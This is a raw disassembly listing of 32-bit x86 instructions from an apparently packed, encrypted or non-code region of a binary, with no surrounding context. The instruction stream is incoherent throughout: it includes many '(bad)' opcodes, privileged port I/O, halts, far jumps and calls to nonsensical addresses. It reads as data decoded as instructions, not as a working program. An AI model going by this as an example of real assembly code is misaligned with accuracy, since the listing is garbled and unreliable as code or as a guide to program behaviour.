  40c20d:	cs dec ebp
  40c20f:	push   edx
  40c210:	cs xchg edi,eax
  40c212:	dec    eax
  40c213:	pop    edx
  40c214:	std    
  40c215:	int3   
  40c216:	aaa    
  40c217:	jo     0x40c202
  40c219:	ret    0x6df4
  40c21c:	inc    ecx
  40c21d:	cmp    esi,ebx
  40c21f:	jge    0x40c200
  40c221:	idiv   DWORD PTR [ebp-0x49]
  40c224:	jl     0x40c244
  40c226:	add    ah,bl
  40c228:	les    esi,FWORD PTR [eax+eiz*2-0x2d]
  40c22c:	repnz or al,0x41
  40c22f:	ins    DWORD PTR es:[edi],dx
  40c230:	xor    esp,ecx
  40c232:	mov    edi,0x2c8f3b64
  40c237:	loope  0x40c1f2
  40c239:	nop
  40c23a:	call   0xce4066a5
  40c23f:	dec    eax
  40c240:	cld    
  40c241:	popf   
  40c242:	ins    BYTE PTR es:[edi],dx
  40c243:	add    DWORD PTR [esi-0x2e54ec11],edi
  40c249:	push   0x92913f89
  40c24e:	mov    dl,0xef
  40c250:	adc    eax,DWORD PTR [esi+edi*1]
  40c253:	xchg   edi,eax
  40c254:	cs scas eax,DWORD PTR es:[edi]
  40c256:	adc    esi,edi
  40c258:	add    eax,0x31ca3554
  40c25d:	out    dx,eax
  40c25e:	sub    al,0x35
  40c260:	add    edx,DWORD PTR [eax+0x1e6b4129]
  40c266:	loop   0x40c2b0
  40c268:	jg     0x40c26f
  40c26a:	adc    dh,BYTE PTR [ebx]
  40c26c:	or     al,0x81
  40c26e:	hlt    
  40c26f:	js     0x40c29d
  40c271:	push   ecx
  40c272:	cdq    
  40c273:	arpl   WORD PTR [ebx+0x10],sp
  40c276:	add    BYTE PTR [ebx+edi*2+0x6],0xa4
  40c27b:	push   esp
  40c27c:	add    edi,DWORD PTR [ecx]
  40c27e:	or     BYTE PTR [esp+edi*4],bh
  40c281:	test   al,0x49
  40c283:	mov    ebx,0xf0ff887f
  40c288:	dec    ebx
  40c289:	out    0xd9,eax
  40c28b:	fdiv   st(2),st
  40c28d:	adc    eax,0xfeffc1fe
  40c292:	adc    DWORD PTR [esi+0x66],esp
  40c295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c296:	ins    DWORD PTR es:[edi],dx
  40c297:	adc    BYTE PTR [ebp-0x42],0x9f
  40c29b:	mov    esp,DWORD PTR [eax]
  40c29d:	jns    0x40c31d
  40c29f:	jnp    0x40c250
  40c2a1:	xlat   BYTE PTR ds:[ebx]
  40c2a2:	mov    ds:0x37f0a952,eax
  40c2a7:	(bad)  
  40c2a8:	cli    
  40c2a9:	fstp   TBYTE PTR [ecx-0x3f80546]
  40c2af:	cli    
  40c2b0:	out    dx,eax
  40c2b1:	ins    DWORD PTR es:[edi],dx
  40c2b2:	adc    ecx,ecx
  40c2b4:	jno    0x40c244
  40c2b6:	fcom   QWORD PTR [ecx+0x3eeff1f0]
  40c2bc:	test   bh,ch
  40c2be:	sti    
  40c2bf:	je     0x40c27c
  40c2c1:	(bad)  
  40c2c3:	ja     0x40c33c
  40c2c5:	adc    DWORD PTR [eax+0x54798ef9],eax
  40c2cb:	pusha  
  40c2cc:	cwde   
  40c2cd:	shl    ah,cl
  40c2cf:	hlt    
  40c2d0:	xor    al,0x2f
  40c2d2:	sbb    al,0x3b
  40c2d4:	lds    esp,FWORD PTR [edi+0x618c733f]
  40c2da:	mov    esp,0x1a7944c0
  40c2df:	iret   
  40c2e0:	outs   dx,DWORD PTR ds:[esi]
  40c2e1:	and    dl,BYTE PTR [ebx]
  40c2e3:	pop    edi
  40c2e4:	dec    ebx
  40c2e5:	(bad)  
  40c2e6:	cld    
  40c2e7:	cwde   
  40c2e8:	mov    dl,0x77
  40c2ea:	shl    DWORD PTR [eax-0x5e6d9eff],0xa
  40c2f1:	push   eax
  40c2f2:	adc    DWORD PTR [edx+0x6],edi
  40c2f5:	rol    BYTE PTR [ebx-0x6ae7dd15],cl
  40c2fb:	or     eax,0x4f5718e6
  40c300:	adc    BYTE PTR [ecx],ch
  40c302:	jae    0x40c2cc
  40c304:	xor    DWORD PTR [edx+0x6e409b51],eax
  40c30a:	fisttp DWORD PTR [esi]
  40c30c:	mov    dl,0x47
  40c30e:	pop    edx
  40c30f:	jmp    0x40c2d0
  40c311:	jb     0x40c36e
  40c313:	xchg   BYTE PTR [ecx],ah
  40c315:	and    al,0x71
  40c317:	(bad)
  40c31b:	xchg   BYTE PTR [ebp-0x1ee4ee78],bh
  40c321:	pop    ecx
  40c322:	fs xor edx,ecx
  40c325:	in     eax,dx
  40c326:	je     0x40c319
  40c328:	fnstsw WORD PTR [esi+0x11a6edf1]
  40c32e:	sbb    dh,0xa
  40c331:	jp     0x40c2e3
  40c333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c334:	sti    
  40c335:	mov    bl,0x89
  40c337:	and    ch,bl
  40c339:	add    BYTE PTR [edi-0x42811ec4],al
  40c33f:	xchg   esi,eax
  40c340:	std    
  40c341:	fwait
  40c342:	xchg   ecx,eax
  40c343:	clc    
  40c344:	inc    ebp
  40c345:	push   0x40
  40c347:	cmp    BYTE PTR [edx+ebp*2],bl
  40c34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c34b:	das    
  40c34c:	mov    ch,0x64
  40c34e:	push   edi
  40c34f:	stc    
  40c350:	jmp    0xf9b15c67
  40c355:	bnd ss ret 0x5b2b
  40c35a:	xchg   edi,eax
  40c35b:	push   ecx
  40c35c:	jp     0x40c2fb
  40c35e:	sub    al,0x8c
  40c360:	xchg   DWORD PTR [edx+esi*1],esi
  40c363:	or     al,0x2b
  40c365:	and    DWORD PTR [edx+0xa4180aa],esi
  40c36b:	jns    0x40c391
  40c36d:	pusha  
  40c36e:	cbw    
  40c370:	dec    ecx
  40c371:	dec    ecx
  40c372:	call   0x15ed:0x1208505a
  40c379:	lock cmp eax,0x91042f81
  40c37f:	push   edi
  40c380:	data16 adc bh,ch
  40c383:	out    0xd7,eax
  40c385:	jg     0x40c382
  40c387:	and    ch,BYTE PTR [ebp-0x700ed00a]
  40c38d:	inc    cl
  40c38f:	div    DWORD PTR [eax+0x7e816fb4]
  40c395:	mov    edi,0x6370536f
  40c39a:	out    dx,eax
  40c39b:	pop    ebx
  40c39c:	dec    esp
  40c39d:	hlt    
  40c39e:	jns    0x40c388
  40c3a0:	outs   dx,BYTE PTR ds:[esi]
  40c3a1:	cwde   
  40c3a2:	ror    BYTE PTR [edi],0xfd
  40c3a5:	int    0x6f
  40c3a7:	gs ins DWORD PTR es:[edi],dx
  40c3a9:	jecxz  0x40c39e
  40c3ab:	cmp    al,0xfa
  40c3ad:	je     0x40c371
  40c3af:	mov    ebx,0x3cf3ade
  40c3b4:	imul   edi
  40c3b6:	aad    0xc9
  40c3b8:	pop    esi
  40c3b9:	mov    bl,0xd2
  40c3bb:	fisttp QWORD PTR [ebp+0xd49dc3e]
  40c3c1:	sbb    BYTE PTR [esi],cl
  40c3c3:	xchg   esp,ecx
  40c3c5:	into   
  40c3c6:	into   
  40c3c7:	shr    BYTE PTR [edx+0x75],cl
  40c3ca:	stc    
  40c3cb:	test   DWORD PTR [edi-0x3],ebx
  40c3ce:	xor    ah,BYTE PTR [edi+0x2e]
  40c3d1:	xchg   esp,eax
  40c3d2:	cdq    
  40c3d3:	pop    ebp
  40c3d4:	cwde   
  40c3d5:	lds    ebp,FWORD PTR [edi]
  40c3d7:	lea    eax,[ecx-0x1c65758]
  40c3dd:	mov    cl,0x9
  40c3df:	sbb    eax,0x242644d7
  40c3e4:	xor    dl,BYTE PTR [ecx+0x63356e78]
  40c3ea:	(bad)  [ecx-0x12243daa]
  40c3f0:	(bad)  
  40c3f1:	jmp    0x6762:0x564caa9f
  40c3f8:	adc    bl,BYTE PTR [ecx+ecx*2]
  40c3fb:	in     al,dx
  40c3fc:	ins    BYTE PTR es:[edi],dx
  40c3fd:	inc    eax
  40c3fe:	push   edi
  40c3ff:	rcr    BYTE PTR [ebx-0x1f],0x94
  40c403:	and    eax,0xe22651fa
  40c408:	sbb    dl,BYTE PTR ds:0x6100ee65
  40c40e:	mov    edi,0x890065af
  40c413:	and    al,0x4e
  40c415:	cmp    al,0x3c
  40c417:	jp     0x40c46d
  40c419:	dec    ebx
  40c41a:	cmp    eax,0xea2c006b
  40c41f:	stos   DWORD PTR es:[edi],eax
  40c420:	jmp    0x40c442
  40c422:	fistp  DWORD PTR [ebx+0x5a]
  40c425:	or     eax,eax
  40c427:	ins    DWORD PTR es:[edi],dx
  40c428:	mov    ebx,0x43e90042
  40c42d:	daa    
  40c42e:	cmp    dl,BYTE PTR [ecx+esi*1+0x2d39e65b]
  40c435:	cld    
  40c436:	xchg   ecx,eax
  40c437:	jb     0x40c3f2
  40c439:	jb     0x40c3f4
  40c43b:	adc    BYTE PTR [eax],0x8c
  40c43e:	les    ecx,FWORD PTR [ebp-0x88f2911]
  40c444:	cmc    
  40c445:	sub    al,0x5f
  40c447:	out    dx,eax
  40c448:	cmp    BYTE PTR [ebx-0x4160a7fe],ah
  40c44e:	xchg   esp,eax
  40c44f:	push   esp
  40c450:	sub    dl,BYTE PTR ds:0xf9623892
  40c456:	in     al,dx
  40c457:	push   ss
  40c458:	xchg   edx,eax
  40c459:	data16 stos BYTE PTR es:[edi],al
  40c45b:	inc    ebx
  40c45c:	mov    dh,ah
  40c45e:	jp     0x40c3e9
  40c460:	xchg   ebx,eax
  40c461:	add    al,0xd5
  40c463:	or     al,0x6
  40c465:	fwait
  40c466:	sbb    al,0xcc
  40c468:	adc    BYTE PTR gs:[esi],cl
  40c46b:	add    cl,BYTE PTR [eax+0x5]
  40c46e:	mov    edi,0x55129ebb
  40c473:	add    BYTE PTR [edx+0x52],0x9
  40c477:	sbb    ah,dh
  40c479:	push   0xffffffc3
  40c47b:	xchg   edi,eax
  40c47c:	out    dx,eax
  40c47d:	sbb    DWORD PTR [edi],0x7b
  40c480:	and    al,0x9
  40c482:	test   cl,cl
  40c484:	adc    bh,BYTE PTR [edi-0x49ea2609]
  40c48a:	mov    dh,0xff
  40c48c:	adc    edi,DWORD PTR [edi]
  40c48e:	cli    
  40c48f:	leave  
  40c490:	out    dx,eax
  40c491:	loope  0x40c441
  40c493:	mov    ebx,0xb76ed00e
  40c498:	inc    edi
  40c499:	cwde   
  40c49a:	inc    eax
  40c49b:	cli    
  40c49c:	pop    esp
  40c49d:	imul   esp,esp,0x3ca1e63
  40c4a3:	je     0x40c460
  40c4a5:	pop    ebp
  40c4a6:	jmp    0xde37:0xf43f0af5
  40c4ad:	enter  0x47b3,0x2f
  40c4b1:	jno    0x40c497
  40c4b3:	scas   al,BYTE PTR es:[edi]
  40c4b4:	cmp    eax,0xc2c3870c
  40c4b9:	jns    0x40c4b9
  40c4bb:	inc    ebp
  40c4bc:	int3   
  40c4bd:	les    edi,FWORD PTR [ebp-0x5fcf9f02]
  40c4c3:	pop    esi
  40c4c4:	scas   eax,DWORD PTR es:[edi]
  40c4c5:	shr    DWORD PTR [esi+esi*1-0x7],cl
  40c4c9:	aad    0x5f
  40c4cb:	inc    DWORD PTR [edx]
  40c4cd:	jg     0x40c4c1
  40c4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d0:	imul   edx,DWORD PTR [eax-0x46],0x13
  40c4d4:	iret   
  40c4d5:	fwait
  40c4d6:	add    BYTE PTR [edi+0x48668ba1],bh
  40c4dc:	test   dh,dh
  40c4de:	out    dx,eax
  40c4df:	in     eax,0x89
  40c4e1:	xor    edx,DWORD PTR [ecx]
  40c4e3:	xchg   cl,ah
  40c4e5:	cmp    BYTE PTR [ecx+ebp*2-0x7def8c02],al
  40c4ec:	popf   
  40c4ed:	cmc    
  40c4ee:	xchg   edi,eax
  40c4ef:	xor    DWORD PTR [edx],edi
  40c4f1:	dec    ebx
  40c4f2:	xor    eax,0xf4eac1d5
  40c4f7:	cli    
  40c4f8:	(bad)  
  40c4f9:	dec    edx
  40c4fa:	jge    0x40c513
  40c4fc:	or     esp,esp
  40c4fe:	or     eax,DWORD PTR [ecx-0x2c7dd9e8]
  40c504:	push   edx
  40c505:	push   es
  40c506:	xor    DWORD PTR [edx],esi
  40c508:	pop    esp
  40c509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c50a:	popa   
  40c50b:	bnd ret 0x609
  40c50f:	xchg   edx,eax
  40c510:	test   BYTE PTR [ecx-0x6771a55c],dl
  40c516:	lahf   
  40c517:	lods   eax,DWORD PTR ds:[esi]
  40c518:	(bad)  
  40c519:	aam    0xc3
  40c51b:	push   esp
  40c51c:	xlat   BYTE PTR ds:[ebx]
  40c51d:	dec    ecx
  40c51e:	push   ebp
  40c51f:	add    BYTE PTR [ebx],dh
  40c521:	xadd   BYTE PTR ds:0x9c714292,dl
  40c528:	outs   dx,BYTE PTR gs:[esi]
  40c52a:	push   ebx
  40c52b:	(bad)  [ebp+0x1c]
  40c52e:	inc    eax
  40c52f:	out    0xe4,al
  40c531:	and    BYTE PTR [ebx],bl
  40c533:	jmp    0xaa482bdf
  40c538:	psraw  mm4,QWORD PTR [edx]
  40c53b:	push   es
  40c53c:	and    esp,edi
  40c53e:	ret    0xe050
  40c541:	jmp    0x40c564
  40c543:	sbb    BYTE PTR [ebx-0x165089a3],0x3e
  40c54a:	jnp    0x40c51d
  40c54c:	ds xor al,0x3
  40c54f:	test   al,0x54
  40c551:	sub    bl,BYTE PTR [ecx]
  40c553:	cs pop ebp
  40c555:	scas   eax,DWORD PTR es:[edi]
  40c556:	xlat   BYTE PTR ds:[ebx]
  40c557:	jmp    0x72fd4151
  40c55c:	push   0x1b
  40c55e:	les    esi,FWORD PTR [esi+ebx*4]
  40c561:	xchg   BYTE PTR [ebp-0x39abc2a6],bl
  40c567:	sbb    eax,0xd9fc6661
  40c56c:	dec    ebx
  40c56d:	test   eax,0xe7f10e9d
  40c572:	popa   
  40c573:	mov    edi,0xddcc088b
  40c578:	adc    al,BYTE PTR [edi+0x426fd490]
  40c57e:	and    al,BYTE PTR ds:0x2a7c19d2
  40c584:	or     DWORD PTR [ecx-0x33bec817],ebp
  40c58a:	add    bl,BYTE PTR [edi-0x4]
  40c58d:	jmp    0x1aff:0xfdefe55
  40c594:	jmp    edx
  40c596:	lahf   
  40c597:	jge    0x40c5d0
  40c599:	neg    DWORD PTR [ecx+edi*1]
  40c59c:	inc    esp
  40c59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c59e:	shl    DWORD PTR [ecx-0x54a324ee],cl
  40c5a4:	sub    BYTE PTR [edi+edx*8-0x14],ah
  40c5a8:	ja     0x40c539
  40c5aa:	lea    esp,[edx-0x6c423a78]
  40c5b0:	sub    al,0xee
  40c5b2:	popf   
  40c5b3:	xor    BYTE PTR fs:[eax],bl
  40c5b6:	fs jb  0x40c5f1
  40c5b9:	out    0x99,al
  40c5bb:	inc    esi
  40c5bc:	shl    DWORD PTR [esi-0x40],1
  40c5bf:	xor    cl,BYTE PTR [ecx+ebx*8+0x799e59d9]
  40c5c6:	out    dx,al
  40c5c7:	add    al,0xbf
  40c5c9:	repnz pop edi
  40c5cb:	sahf   
  40c5cc:	arpl   WORD PTR [ebx-0xb1b36cd],si
  40c5d2:	cmp    BYTE PTR [ecx],cl
  40c5d4:	xor    eax,0x461050e2
  40c5d9:	or     DWORD PTR [ecx+0x20],eax
  40c5dc:	nop
  40c5dd:	mov    cl,0xa3
  40c5df:	dec    esi
  40c5e0:	mov    ecx,0xb10c2dd4
  40c5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e6:	push   0xffffff80
  40c5e8:	fisubr DWORD PTR [esp+ebx*1]
  40c5eb:	ret    0x7616
  40c5ee:	jg     0x40c5fa
  40c5f0:	ror    DWORD PTR ds:0xb6a572a3,cl
  40c5f6:	mov    ecx,0xf6031ea0
  40c5fb:	jb     0x40c593
  40c5fd:	sub    ebp,DWORD PTR [ebx-0x77c4df40]
  40c603:	add    eax,0xb6c8ba29
  40c608:	hlt    
  40c609:	cdq    
  40c60a:	shr    bl,cl
  40c60c:	stos   BYTE PTR es:[edi],al
  40c60d:	jp     0x40c59f
  40c60f:	xor    dl,ch
  40c611:	inc    DWORD PTR [ebx+0x49]
  40c614:	sbb    BYTE PTR [esi],ah
  40c616:	mov    WORD PTR [edi+0x12],ss
  40c619:	test   dh,0x4f
  40c61c:	adc    DWORD PTR [esi-0x1f],eax
  40c61f:	mov    BYTE PTR [edx],cl
  40c621:	pusha  
  40c622:	pop    edx
  40c623:	mov    ecx,0x7373665c
  40c628:	xor    eax,ebx
  40c62a:	add    ah,dh
  40c62c:	cmp    BYTE PTR ds:0x1321b70,bl
  40c632:	cdq    
  40c633:	mov    dh,0x1b
  40c635:	add    al,0xe0
  40c637:	dec    ecx
  40c638:	test   eax,0x41063792
  40c63d:	mov    al,ds:0x33f9bf25
  40c642:	int    0xe5
  40c644:	(bad)  
  40c645:	jmp    0x5a5dfb91
  40c64a:	adc    al,0x25
  40c64c:	out    0xb6,al
  40c64e:	pop    ebx
  40c64f:	add    eax,0xcfb5aff5
  40c654:	popf   
  40c655:	shr    BYTE PTR [edx],cl
  40c657:	sbb    al,0xa2
  40c659:	sub    al,0x57
  40c65b:	sub    ebp,DWORD PTR [esi+ebp*4+0x2dbdb1ae]
  40c662:	pushf  
  40c663:	add    DWORD PTR [edi+0x3892673e],edx
  40c669:	nop
  40c66a:	shl    BYTE PTR ds:0xe91e9904,1
  40c670:	es or  cl,cl
  40c673:	inc    edx
  40c674:	jg     0x40c69d
  40c676:	and    BYTE PTR [eax+0x64],cl
  40c679:	aad    0x2
  40c67b:	jne    0x40c61b
  40c67d:	mov    DWORD PTR [ecx],ecx
  40c67f:	sar    BYTE PTR [ecx+0x3],1
  40c682:	sar    BYTE PTR [ecx+0x8],1
  40c685:	test   DWORD PTR [edx],esi
  40c687:	mov    ch,BYTE PTR [ecx-0x6776fabd]
  40c68d:	jecxz  0x40c640
  40c68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c690:	xlat   BYTE PTR ds:[ebx]
  40c691:	clc    
  40c692:	loope  0x40c713
  40c694:	clc    
  40c695:	sub    DWORD PTR [esi-0x16],edi
  40c698:	pop    edi
  40c699:	jge    0x40c61f
  40c69b:	cmp    ecx,DWORD PTR [esi]
  40c69d:	in     eax,dx
  40c69e:	arpl   WORD PTR [ebx+0x7b],di
  40c6a1:	cmp    esp,DWORD PTR [ebx+0x5d]
  40c6a4:	into   
  40c6a5:	xor    eax,DWORD PTR [eax]
  40c6a7:	ja     0x40c68f
  40c6a9:	pop    ecx
  40c6aa:	push   ds
  40c6ab:	rcr    BYTE PTR [ebx+0x113b23e4],cl
  40c6b1:	jp     0x40c684
  40c6b3:	fadd   QWORD PTR [edi+esi*4]
  40c6b6:	jg     0x40c6bf
  40c6b8:	add    DWORD PTR [ecx],0x73
  40c6bb:	jae    0x40c730
  40c6bd:	mov    ah,0x3b
  40c6bf:	cmp    eax,0xfe5fdffe
  40c6c4:	xor    ah,BYTE PTR [edi-0x1a07fa32]
  40c6ca:	sbb    eax,esi
  40c6cc:	(bad)  
  40c6cd:	xchg   ecx,eax
  40c6ce:	push   esp
  40c6cf:	mov    BYTE PTR [edx+0x55],ah
  40c6d2:	inc    esi
  40c6d3:	cmp    al,0x8e
  40c6d5:	xchg   ebp,eax
  40c6d6:	mov    al,ds:0x6ec42390
  40c6db:	(bad)  
  40c6dc:	mov    ebp,DWORD PTR [ebx-0x80]
  40c6df:	jae    0x40c702
  40c6e1:	mov    esi,0x5e5c5833
  40c6e6:	xor    BYTE PTR [edx-0x42],dh
  40c6e9:	jnp    0x40c67b
  40c6eb:	mov    ah,0x8b
  40c6ed:	pop    ecx
  40c6ee:	push   ebp
  40c6ef:	inc    edx
  40c6f0:	jg     0x40c70d
  40c6f2:	out    0xfb,eax
  40c6f4:	pop    ecx
  40c6f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6f6:	sub    BYTE PTR [ebx],0xf0
  40c6f9:	shl    BYTE PTR [ecx],cl
  40c6fb:	loope  0x40c736
  40c6fd:	enter  0x7cc4,0x53
  40c701:	push   ebp
  40c702:	or     eax,eax
  40c704:	dec    esp
  40c705:	cmp    dl,BYTE PTR [edx-0x3a]
  40c708:	rcl    BYTE PTR [edx+0x200fc7d7],0xec
  40c70f:	lea    edx,[esi+0x3]
  40c712:	xor    bh,ch
  40c714:	jmp    0xd18fc614
  40c719:	popf   
  40c71a:	sbb    eax,0xc768a560
  40c71f:	lods   eax,DWORD PTR ds:[esi]
  40c720:	push   0x4d0061bb
  40c725:	ret    
  40c726:	add    BYTE PTR [edi+edi*4+0x64],bh
  40c72a:	cmp    DWORD PTR [edi+0x84250f9],esi
  40c730:	sbb    eax,0xfff5980d
  40c735:	pop    ss
  40c736:	jmp    0x8e37c0ca
  40c73b:	test   dl,bh
  40c73d:	cmp    ebx,DWORD PTR [ebp+0x77]
  40c740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c741:	repz bound ebx,QWORD PTR [ebp-0x1d]
  40c745:	sar    ah,0x49
  40c748:	test   eax,0x6ab54f0c
  40c74d:	xchg   ebp,eax
  40c74e:	adc    esp,DWORD PTR [edi]
  40c750:	ss push 0x82564bb5
  40c756:	fadd   DWORD PTR [ecx]
  40c758:	fs call 0xf3118a9c
  40c75e:	dec    eax
  40c75f:	and    BYTE PTR [ebx-0x8],cl
  40c762:	xchg   esi,eax
  40c763:	loopne 0x40c786
  40c765:	mov    ebx,0xb7cee49c
  40c76a:	int3   
  40c76b:	inc    eax
  40c76c:	and    al,BYTE PTR [ebp-0x76ef5719]
  40c772:	cs push cs
  40c774:	in     al,0x4a
  40c776:	adc    al,0xf
  40c778:	sub    esi,esi
  40c77a:	lock mov ch,0x67
  40c77d:	loope  0x40c7c6
  40c77f:	ds stc 
  40c781:	sub    DWORD PTR [esi-0x6],edi
  40c784:	(bad)  
  40c785:	aas    
  40c786:	into   
  40c787:	fsub   st(4),st
  40c789:	xor    al,0x1b
  40c78b:	sbb    ebx,DWORD PTR [ebx]
  40c78d:	push   0xffffffaf
  40c78f:	out    0x8d,eax
  40c791:	pop    eax
  40c792:	lock repz push edx
  40c795:	mov    ebx,0xd7702548
  40c79a:	mov    esp,DWORD PTR [eax-0x3ff0c442]
  40c7a0:	xor    BYTE PTR [ecx],cl
  40c7a2:	arpl   bp,si
  40c7a4:	lahf   
  40c7a5:	cwde   
  40c7a6:	cwde   
  40c7a7:	loopne 0x40c7c0
  40c7a9:	jg     0x40c790
  40c7ab:	or     edi,DWORD PTR [esi+edi*8-0x35]
  40c7af:	push   edi
  40c7b0:	or     DWORD PTR [ebx+0x24d13c25],edx
  40c7b6:	mov    eax,ds:0x262389aa
  40c7bb:	mov    es,WORD PTR [ebp+0x5217b58a]
  40c7c1:	sti    
  40c7c2:	sti    
  40c7c3:	sbb    eax,0x6cf5aec9
  40c7c8:	xchg   ecx,eax
  40c7c9:	leave  
  40c7ca:	mov    edx,0xedcfc963
  40c7cf:	jp     0x40c7b8
  40c7d1:	js     0x40c81a
  40c7d3:	mov    edx,0xc920461b
  40c7d8:	xor    DWORD PTR [eax],edx
  40c7da:	out    0x72,eax
  40c7dc:	xchg   esi,eax
  40c7dd:	xchg   BYTE PTR ds:0xd31748b3,dh
  40c7e3:	imul   eax,DWORD PTR [edx],0x45
  40c7e6:	inc    esi
  40c7e7:	rol    DWORD PTR [esp+edi*8+0x2e761278],0x48
  40c7ef:	ins    BYTE PTR es:[edi],dx
  40c7f0:	rol    BYTE PTR [ecx-0x721cf63b],cl
  40c7f6:	sbb    BYTE PTR [edi+0x24bdbc98],cl
  40c7fc:	outs   dx,DWORD PTR ds:[esi]
  40c7fd:	mov    ds:0xe829ebe9,eax
  40c802:	jmp    0x4db8:0x17baf67e
  40c809:	cs inc eax
  40c80b:	mov    eax,0xa4202309
  40c810:	leave  
  40c811:	cmp    eax,0x668091b3
  40c816:	neg    BYTE PTR [edi-0x251b2665]
  40c81c:	pop    ecx
  40c81d:	sub    DWORD PTR [edi-0x7b],0x692d7fbe
  40c824:	lahf   
  40c825:	pop    edi
  40c826:	idiv   DWORD PTR [edi+ecx*4]
  40c829:	sahf   
  40c82a:	push   cs
  40c82b:	scas   eax,DWORD PTR es:[edi]
  40c82c:	xchg   ebp,eax
  40c82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c82e:	push   eax
  40c82f:	(bad)  
  40c831:	mov    DWORD PTR [edx],ebp
  40c833:	iret   
  40c834:	sahf   
  40c835:	pop    ebp
  40c836:	mov    eax,ds:0x40652ad3
  40c83b:	mov    es,eax
  40c83d:	or     edi,edi
  40c83f:	int    0x41
  40c841:	(bad)  
  40c842:	in     al,dx
  40c843:	mov    dh,0x3c
  40c845:	shr    DWORD PTR [ebx-0x1b156aff],1
  40c84b:	ret    0x2739
  40c84e:	inc    ebp
  40c84f:	push   cs
  40c850:	jbe    0x40c82b
  40c852:	xor    BYTE PTR [ecx+eiz*2],ah
  40c855:	push   eax
  40c856:	add    BYTE PTR [eax],cl
  40c858:	mov    eax,ds:0xb48c8098
  40c85d:	retf   
  40c85e:	push   eax
  40c85f:	pop    edi
  40c860:	xor    esp,DWORD PTR [ecx-0x7a]
  40c863:	das    
  40c864:	aas    
  40c865:	jbe    0x40c7fc
  40c867:	pop    ds
  40c868:	stc    
  40c869:	in     al,0x7f
  40c86b:	loope  0x40c834
  40c86d:	jg     0x40c85b
  40c86f:	arpl   WORD PTR [ebx+ebx*4],si
  40c872:	dec    ebp
  40c873:	mov    dh,0xb6
  40c875:	mov    dh,0x9c
  40c877:	jnp    0x40c866
  40c879:	lods   al,BYTE PTR ds:[esi]
  40c87a:	mov    bh,0x17
  40c87c:	mov    eax,ds:0xbcbefc83
  40c881:	and    eax,edx
  40c883:	adc    BYTE PTR [edi-0x71dfd8c5],bh
  40c889:	arpl   si,si
  40c88b:	in     al,dx
  40c88c:	fld    st(3)
  40c88e:	repz inc edi
  40c890:	iret   
  40c891:	lock test eax,0xd5a31f4f
  40c897:	popf   
  40c898:	les    ebp,FWORD PTR [ebx]
  40c89a:	dec    edi
  40c89b:	and    al,BYTE PTR [ebp-0x7d]
  40c89e:	and    al,0x11
  40c8a0:	test   BYTE PTR [ecx+0x44],dl
  40c8a3:	adc    al,0x79
  40c8a5:	inc    esp
  40c8a6:	push   ecx
  40c8a7:	inc    edx
  40c8a8:	sbb    BYTE PTR [ecx+0x84f7f20],ch
  40c8ae:	lock int3 
  40c8b0:	test   DWORD PTR [eax+0x25],0x197efdbd
  40c8b7:	pop    ebx
  40c8b8:	and    BYTE PTR [edx+0x36],0xe
  40c8bc:	(bad)  
  40c8be:	out    dx,eax
  40c8bf:	out    0xd9,al
  40c8c1:	arpl   WORD PTR [ecx],sp
  40c8c3:	popf   
  40c8c4:	aad    0x58
  40c8c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8c7:	dec    edx
  40c8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8c9:	ret    0x65ca
  40c8cc:	push   cs
  40c8cd:	inc    ebp
  40c8ce:	enter  0x6d40,0x1f
  40c8d2:	cmc    
  40c8d3:	push   esp
  40c8d4:	fs xchg ecx,eax
  40c8d6:	mov    al,ds:0xeaa404ca
  40c8db:	add    DWORD PTR [edx+0x41834489],ebp
  40c8e1:	int3   
  40c8e2:	mov    eax,ds:0x2a546303
  40c8e7:	and    eax,0xb9fbb6b6
  40c8ec:	jecxz  0x40c941
  40c8ee:	aad    0x38
  40c8f0:	dec    ecx
  40c8f1:	adc    dh,BYTE PTR [esi]
  40c8f3:	aaa    
  40c8f4:	aaa    
  40c8f5:	mov    ecx,DWORD PTR [edx-0x760d437f]
  40c8fb:	dec    edi
  40c8fc:	jl     0x40c8e0
  40c8fe:	fidiv  DWORD PTR [ecx]
  40c900:	(bad)  
  40c902:	shl    BYTE PTR [esi+0x4ba0376b],0xcc
  40c909:	cs push ebx
  40c90b:	jo     0x40c904
  40c90d:	in     eax,0x97
  40c90f:	and    DWORD PTR [ebx],ecx
  40c911:	or     esp,0xfffffffa
  40c914:	aaa    
  40c915:	fimul  DWORD PTR [esi]
  40c917:	pusha  
  40c918:	scas   al,BYTE PTR es:[edi]
  40c919:	jae    0x40c93e
  40c91b:	sti    
  40c91c:	inc    eax
  40c91d:	jge    0x40c8b9
  40c91f:	dec    eax
  40c920:	iret   
  40c921:	popf   
  40c922:	aaa    
  40c923:	push   eax
  40c924:	push   eax
  40c925:	or     DWORD PTR es:[esi-0x5b],edi
  40c929:	add    BYTE PTR [edx+esi*2-0x12],0xfc
  40c92e:	cmp    dh,BYTE PTR [edx]
  40c930:	sub    al,BYTE PTR [ebx-0x27]
  40c933:	cmp    eax,0xe839d85f
  40c938:	out    dx,al
  40c939:	mov    ebx,0x61c7c258
  40c93e:	or     BYTE PTR [ecx-0x29],bh
  40c941:	pop    ds
  40c942:	test   eax,0xb810c0cd
  40c947:	cmp    DWORD PTR [edi],edi
  40c949:	add    ecx,DWORD PTR [esi+0x2c280432]
  40c94f:	mov    cl,0x4b
  40c951:	push   esp
  40c952:	cwde   
  40c953:	jle    0x40c971
  40c955:	inc    ebx
  40c956:	pop    edx
  40c957:	ror    DWORD PTR [edi+0x0],cl
  40c95a:	push   ds
  40c95b:	xor    DWORD PTR [ebx+0x2b8bee7c],esi
  40c961:	cld    
  40c962:	jecxz  0x40c983
  40c964:	std    
  40c965:	adc    al,0xff
  40c967:	cld    
  40c968:	lahf   
  40c969:	jle    0x40c8ff
  40c96b:	inc    esi
  40c96c:	mov    ds:0xba30f361,eax
